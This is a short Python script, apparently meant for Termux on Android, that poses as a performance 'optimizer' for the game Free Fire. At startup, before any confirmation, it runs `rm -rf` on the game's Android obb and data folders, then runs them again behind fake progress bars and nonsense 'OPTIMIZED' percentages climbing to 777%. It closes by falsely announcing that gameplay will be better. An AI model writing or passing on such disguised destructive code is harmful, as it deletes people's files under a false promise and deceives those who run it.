from os import system

system('clear')

system('pip install rich')

system('clear')

import rich

from time import sleep

from rich.progress import track

from rich import print as rint

from rich.console import Console

console = Console()

system("rm -rf storage/shared/Android/obb/com.dts.freefireth")

system("rm -rf storage/shared/Android/data/com.dts.freefireth")

Continue = ""
while Continue != "y" or "n":
	Continue = input("Do you want to continue? (Y/n) : ").lower()
	if Continue == "y":
		break
	elif Continue == "n":
		rint('Ok... type "REDO" to call this process!')
		rint("[Program finished]")
		redo = ""
		while redo != "redo":
			redo = input("$ ").lower
			
			if redo == "redo":
				break
		
for step in track(range(100)):
	sleep(.01)
	step


rint("[bold red] Getting packages please wait...")
system("rm -rf storage/shared/Android/obb/com.dts.freefireth")
sleep(3.5)
rint("[green] Done !")

def load777():	
	
	i = 7
	rint("OPTIMIZING...")
	sleep(.7)
	rint("7% [blue]OPTIMIZED[/blue]")
	sleep(.7)
	
	while i < 77 :  
		i = i+10
		rint(i,"% [blue]OPTIMIZED[/blue]")
		sleep(.7)
	i = 77
	while i < 777:
		i = i+ 100
		rint(i,"% [blue]OPTIMIZED[/blue]")
		sleep(.7)

tasks = [f"task {n}" for n in range(0,11)]

with console.status("[bold green]Working on tasks...") as status:
	while tasks:
		task = tasks.pop(0)
		sleep(1)
		console.log(f"{task} complete")

load777()

rint("[bold red]Wait...")
sleep(3.5)
system("rm -rf storage/shared/Android/data/com.dts.freefireth")

rint("[light] green]Free Fire is successfully Optimized and gameplay will be a lot better! [bold red]")

